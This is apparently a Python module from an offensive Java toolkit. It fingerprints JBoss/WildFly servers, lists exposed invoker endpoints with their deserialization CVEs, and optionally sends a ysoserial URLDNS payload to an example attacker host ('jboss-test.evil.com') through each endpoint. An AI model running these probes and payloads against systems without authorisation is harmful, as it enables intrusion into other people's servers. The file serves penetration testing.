"""JBoss / WildFly scanner — fingerprint + invoker enumeration.

Replaces the NotImplementedError stub with a real scanner that:

1. Fingerprints the target (HTTP banner + binary Remoting 2 probe).
2. Enumerates reachable HTTP invoker endpoints.
3. Reports likely exploit vectors with CVE references.
"""

from __future__ import annotations

import socket
from dataclasses import dataclass, field
from typing import Any

from javapwner.protocols.jboss.fingerprint import JBossFingerprint, JBossFingerprinter
from javapwner.protocols.jboss.invoker import HttpInvoker

# CVE context per invoker path
_PATH_CVE_MAP = {
    "/invoker/JMXInvokerServlet": "CVE-2015-7501",
    "/invoker/EJBInvokerServlet": "CVE-2017-7504",
    "/invoker/readonly": "CVE-2017-12149",
    "/web-console/Invoker": "CVE-2015-7501 (web-console variant)",
    "/remoting/httpInvoker": "Spring-HTTP-Invoker-Deser",
    "/spring-remoting/": "Spring-HTTP-Invoker-Deser",
    "/remoting/": "Spring-HTTP-Invoker-Deser",
    "/jmx-console/": "JBoss-JMX-Console",
    "/admin-console/": "JBoss-Admin-Console",
}


@dataclass
class JBossScanResult:
    """Full result of a JBoss scan."""

    host: str
    port: int

    # Connectivity
    is_open: bool = False

    # Fingerprint
    fingerprint: JBossFingerprint | None = None

    # HTTP invoker
    invoker_endpoints: list[str] = field(default_factory=list)
    invoker_cves: list[str] = field(default_factory=list)

    # URLDNS canary (I.6)
    urldns_sent: bool = False
    urldns_canary: str | None = None

    # Error
    error: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "host": self.host,
            "port": self.port,
            "is_open": self.is_open,
            "fingerprint": self.fingerprint.to_dict() if self.fingerprint else None,
            "invoker_endpoints": self.invoker_endpoints,
            "invoker_cves": self.invoker_cves,
            "urldns_sent": self.urldns_sent,
            "urldns_canary": self.urldns_canary,
            "error": self.error,
        }


class JBossScanner:
    """Scan a JBoss / WildFly endpoint for fingerprint and exploit surface.

    Parameters
    ----------
    timeout:
        Network timeout in seconds.
    """

    DEFAULT_PORT = 8080

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def scan(
        self,
        host: str,
        port: int,
        scheme: str = "http",
        urldns_canary: str | None = None,
    ) -> JBossScanResult:
        """Run the full scan: fingerprint → invoker enumeration → optional URLDNS.

        Parameters
        ----------
        urldns_canary:
            If provided (e.g. ``'jboss-test.evil.com'``), send a URLDNS
            payload via each reachable invoker endpoint to detect blind
            deserialization.  Check DNS logs for resolution.
        """
        result = JBossScanResult(host=host, port=port)

        # Step 1: fingerprint
        fingerprinter = JBossFingerprinter(timeout=self.timeout, scheme=scheme)
        try:
            fp = fingerprinter.fingerprint(host, port)
            result.fingerprint = fp
            if fp.is_jboss or fp.invoker_paths or fp.remoting2_confirmed:
                result.is_open = True
        except Exception as exc:
            result.error = f"Fingerprint error: {exc}"
            return result

        if not result.is_open:
            try:
                with socket.create_connection((host, port), timeout=self.timeout):
                    result.is_open = True
            except OSError:
                result.error = f"Port {port} closed or filtered"
                return result

        # Step 2: HTTP invoker enumeration
        invoker = HttpInvoker(timeout=self.timeout, scheme=scheme)
        try:
            reachable = invoker.probe_endpoints(host, port)
            result.invoker_endpoints = reachable
            result.invoker_cves = [
                _PATH_CVE_MAP[p] for p in reachable if p in _PATH_CVE_MAP
            ]
        except Exception as exc:
            result.error = f"Invoker probe error: {exc}"

        # Step 3: URLDNS canary — blind deserialization detection (I.6)
        if urldns_canary and result.invoker_endpoints:
            self._urldns_probe(host, port, urldns_canary, result, invoker)

        return result

    def _urldns_probe(
        self,
        host: str,
        port: int,
        canary: str,
        result: JBossScanResult,
        invoker: HttpInvoker,
    ) -> None:
        """Send a URLDNS ysoserial payload via each reachable invoker endpoint."""
        try:
            from javapwner.core.payload import YsoserialWrapper
            wrapper = YsoserialWrapper()
            payload = wrapper.generate_urldns(canary)
        except Exception:
            return

        for path in result.invoker_endpoints:
            try:
                invoker.exploit(host, port, payload, path=path)
            except Exception:
                continue

        result.urldns_sent = True
        result.urldns_canary = canary
